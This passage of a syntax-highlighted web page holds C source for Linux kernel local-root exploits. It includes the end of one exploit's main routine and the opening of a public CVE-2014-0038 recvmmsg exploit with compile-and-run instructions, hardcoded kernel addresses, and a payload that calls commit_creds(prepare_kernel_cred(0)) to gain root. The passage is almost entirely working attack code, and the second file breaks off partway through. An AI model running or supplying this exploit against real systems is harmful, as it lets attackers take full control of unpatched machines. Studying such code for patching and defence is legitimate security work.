  mmapped </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">off</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">original_value </span><span style="color:#89ddff;">&amp; ~(</span><span style="color:#82aaff;">sysconf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">_SC_PAGE_SIZE</span><span style="color:#89ddff;">) - </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  mmapped </span><span style="color:#89ddff;">&amp;= 0x</span><span style="color:#f78c6c;">000000ffffffffff</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">srand</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">time</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  port </span><span style="color:#89ddff;">= (</span><span style="color:#82aaff;">rand</span><span style="color:#89ddff;">() % </span><span style="color:#f78c6c;">30000</span><span style="color:#89ddff;">)+</span><span style="color:#f78c6c;">1500</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  commit_creds </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_commit_creds</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">off</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">commit_creds</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  prepare_kernel_cred </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_prepare_kernel_cred</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">off</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">prepare_kernel_cred</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  mmapped </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">long</span><span style="color:#89ddff;">)</span><span style="color:#82aaff;">mmap</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">mmapped</span><span style="color:#89ddff;">, </span><span style="color:#82aaff;">sysconf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">_SC_PAGE_SIZE</span><span style="color:#89ddff;">)*</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> PROT_READ</span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">PROT_WRITE</span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">PROT_EXEC</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> MAP_PRIVATE</span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">MAP_ANONYMOUS</span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">MAP_FIXED</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">mmapped </span><span style="color:#89ddff;">== -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">mmap()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">mmapped</span><span style="color:#89ddff;">,0x</span><span style="color:#f78c6c;">90</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;">sysconf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">_SC_PAGE_SIZE</span><span style="color:#89ddff;">)*</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memcpy</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">mmapped </span><span style="color:#89ddff;">+ </span><span style="color:#82aaff;">sysconf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">_SC_PAGE_SIZE</span><span style="color:#89ddff;">), (</span><span style="font-style:italic;color:#c792ea;">char </span><span style="color:#89ddff;">*)&amp;</span><span style="color:#82aaff;">trampoline</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">300</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">mprotect</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">mmapped</span><span style="color:#89ddff;">, </span><span style="color:#82aaff;">sysconf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">_SC_PAGE_SIZE</span><span style="color:#89ddff;">)*</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> PROT_READ</span><span style="color:#89ddff;">|</span><span style="color:#82aaff;">PROT_EXEC</span><span style="color:#89ddff;">) != </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">mprotect()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  sockfd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">socket</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">AF_INET</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SOCK_DGRAM</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">sockfd </span><span style="color:#89ddff;">== -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">socket()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_family </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> AF_INET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_addr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">s_addr </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htonl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">INADDR_LOOPBACK</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_port </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htons</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">port</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">bind</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockfd</span><span style="color:#89ddff;">, (</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> sockaddr </span><span style="color:#89ddff;">*) &amp;</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">)) == -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">bind()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">msgs</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">msgs</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  iovecs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iovecs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> BUFSIZE</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msgs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">msg_hdr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iov </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">iovecs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  msgs</span><span style="color:#89ddff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">].</span><span style="color:#eeffff;">msg_hdr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iovlen </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">for</span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">=</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">3 </span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">i</span><span style="color:#89ddff;">++) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">udp</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">i</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    retval </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">syscall</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">__NR_recvmmsg</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> sockfd</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> msgs</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> VLEN</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, (</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">off</span><span style="color:#89ddff;">-&gt;</span><span style="color:#eeffff;">dest</span><span style="color:#89ddff;">+</span><span style="color:#f78c6c;">7</span><span style="color:#89ddff;">-</span><span style="color:#82aaff;">i</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if</span><span style="color:#89ddff;">(!</span><span style="color:#eeffff;">retval</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;\n</span><span style="color:#c3e88d;">recvmmsg() failed</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockfd</span><span style="color:#89ddff;">); </span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">fprintf</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">stderr</span><span style="color:#89ddff;">,&quot;\n&quot;);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">trigger</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span></code></pre><p></p>
<pre style="background-color:#212121;">
<code class="language-cpp" data-lang="cpp"><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
* Local root exploit for CVE-2014-0038.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* https://raw.github.com/saelo/cve-2014-0038/master/timeoutpwn.c</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Bug: The X86_X32 recvmmsg syscall does not properly sanitize the timeout pointer</span><span style="font-style:italic;color:#4a4a4a;">
* passed from userspace.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,</span><span style="font-style:italic;color:#4a4a4a;">
* if the original byte at that address is known it can be overwritten</span><span style="font-style:italic;color:#4a4a4a;">
* with known data.</span><span style="font-style:italic;color:#4a4a4a;">
* If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Restrictions: The first long at the passed address (tv_sec) has to be positive</span><span style="font-style:italic;color:#4a4a4a;">
* and the second long (tv_nsec) has to be smaller than 1000000000.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Overview: Target the release function pointer of the ptmx_fops structure located in</span><span style="font-style:italic;color:#4a4a4a;">
* non initialized (and thus writable) kernel memory. Zero out the three most</span><span style="font-style:italic;color:#4a4a4a;">
* significant bytes and thus turn it into a pointer to an address mappable in</span><span style="font-style:italic;color:#4a4a4a;">
* user space.</span><span style="font-style:italic;color:#4a4a4a;">
* The release pointer is used as it is followed by 16 0x00 bytes (so the tv_nsec</span><span style="font-style:italic;color:#4a4a4a;">
* is valid).</span><span style="font-style:italic;color:#4a4a4a;">
* Open /dev/ptmx, close it and enjoy.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Not very beautiful but should be fairly reliable if symbols can be resolved.</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Tested on Ubuntu 13.10</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* gcc timeoutpwn.c -o pwn &amp;&amp; ./pwn</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* Written by saelo</span><span style="font-style:italic;color:#4a4a4a;">
*/</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">_GNU_SOURCE</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">netinet/ip.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdio.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">stdlib.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">time.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">string.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">unistd.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">fcntl.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/socket.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/stat.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/syscall.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/wait.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#include </span><span style="color:#89ddff;">&lt;</span><span style="color:#c3e88d;">sys/mman.h</span><span style="color:#89ddff;">&gt;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">__X32_SYSCALL_BIT </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">40000000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#undef</span><span style="color:#eeffff;"> __NR_recvmmsg</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">__NR_recvmmsg </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">__X32_SYSCALL_BIT </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">537</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">BUFSIZE </span><span style="color:#f78c6c;">200</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">PAYLOADSIZE </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">2000</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">FOPS_RELEASE_OFFSET </span><span style="color:#f78c6c;">13</span><span style="color:#89ddff;">*</span><span style="color:#f78c6c;">8</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
* Adapt these addresses for your need.</span><span style="font-style:italic;color:#4a4a4a;">
* see /boot/System.map* or /proc/kallsyms</span><span style="font-style:italic;color:#4a4a4a;">
* These are the offsets from ubuntu 3.11.0-12-generic.</span><span style="font-style:italic;color:#4a4a4a;">
*/</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">PTMX_FOPS </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffffffff81fb30c0</span><span style="font-style:italic;color:#c792ea;">LL</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">TTY_RELEASE </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffffffff8142fec0</span><span style="font-style:italic;color:#c792ea;">LL</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">COMMIT_CREDS </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffffffff8108ad40</span><span style="font-style:italic;color:#c792ea;">LL</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">#define </span><span style="color:#eeffff;">PREPARE_KERNEL_CRED </span><span style="color:#89ddff;">0x</span><span style="color:#f78c6c;">ffffffff8108b010</span><span style="font-style:italic;color:#c792ea;">LL</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef int </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _commit_creds</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">typedef unsigned long </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">))) (*</span><span style="color:#eeffff;"> _prepare_kernel_cred</span><span style="color:#89ddff;">)(</span><span style="font-style:italic;color:#c792ea;">unsigned long</span><span style="color:#eeffff;"> cred</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
* Match signature of int release(struct inode*, struct file*).</span><span style="font-style:italic;color:#4a4a4a;">
*</span><span style="font-style:italic;color:#4a4a4a;">
* See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz</span><span style="font-style:italic;color:#4a4a4a;">
*/</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#c792ea;">__attribute__</span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">regparm</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">3</span><span style="color:#89ddff;">)))</span><span style="color:#eeffff;">
</span><span style="color:#82aaff;">kernel_payload</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">* </span><span style="color:#f78c6c;">foo</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">* </span><span style="color:#f78c6c;">bar</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  _commit_creds commit_creds </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_commit_creds</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">COMMIT_CREDS</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  _prepare_kernel_cred prepare_kernel_cred </span><span style="color:#89ddff;">= (</span><span style="color:#eeffff;">_prepare_kernel_cred</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">PREPARE_KERNEL_CRED</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">*((</span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#89ddff;">*)(</span><span style="color:#eeffff;">PTMX_FOPS </span><span style="color:#89ddff;">+</span><span style="color:#eeffff;"> FOPS_RELEASE_OFFSET </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">4</span><span style="color:#89ddff;">)) = -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">; </span><span style="font-style:italic;color:#4a4a4a;">// restore pointer</span><span style="font-style:italic;color:#4a4a4a;">
  </span><span style="color:#82aaff;">commit_creds</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">prepare_kernel_cred</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#89ddff;">-</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
* Write a zero to the byte at then given address.</span><span style="font-style:italic;color:#4a4a4a;">
* Only works if the current value is 0xff.</span><span style="font-style:italic;color:#4a4a4a;">
*/</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">void </span><span style="color:#82aaff;">zero_out</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">long </span><span style="color:#f78c6c;">addr</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> sockfd</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> retval</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> port</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> pid</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> sockaddr_in sa</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">[</span><span style="color:#eeffff;">BUFSIZE</span><span style="color:#89ddff;">];</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> mmsghdr msgs</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#eeffff;"> iovec iovecs</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">srand</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">time</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  port </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1024 </span><span style="color:#89ddff;">+ (</span><span style="color:#82aaff;">rand</span><span style="color:#89ddff;">() % (0x</span><span style="color:#f78c6c;">10000 </span><span style="color:#89ddff;">- </span><span style="color:#f78c6c;">1024</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  sockfd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">socket</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">AF_INET</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SOCK_DGRAM</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">sockfd </span><span style="color:#89ddff;">== -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">socket()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_family </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> AF_INET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_addr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">s_addr </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htonl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">INADDR_LOOPBACK</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_port </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htons</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">port</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
